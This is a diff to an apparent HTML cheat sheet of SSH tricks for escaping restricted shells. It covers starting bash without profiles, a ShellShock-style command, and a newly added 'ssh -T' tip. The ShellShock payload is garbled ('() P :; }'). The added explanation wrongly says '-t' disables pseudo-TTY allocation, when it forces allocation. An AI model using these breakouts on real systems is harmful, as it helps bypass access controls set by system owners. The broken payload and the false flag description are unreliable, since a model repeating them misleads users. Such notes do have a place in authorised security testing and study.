@@ -10,4 +10,13 @@ Start remote shell without loading the "rc" profile (where most limitations are 
 &nbsp;&#09;ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t "bash --noprofile"<br/>
 <br/>
 Try ShellShock on vulnerable shell implementations<br/>
-&nbsp;&#09;ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t "() P :; }; /bin/bash"</body></html>
+&nbsp;&#09;ssh &lt;RHOST&gt;@&lt;RHOST&gt; -t "() P :; }; /bin/bash"<br/>
+<br/>
+<br/>
+Sometimes just -T will work<br/>
+ssh &lt;ruser&gt;@&lt;rhost&gt; -T<br/>
+<br/>
+<br/>
+<br/>
+-T is to disable pseudo-TTY allocation<br/>
+-t is to force disable pseudo-TTY allocation</body></html>
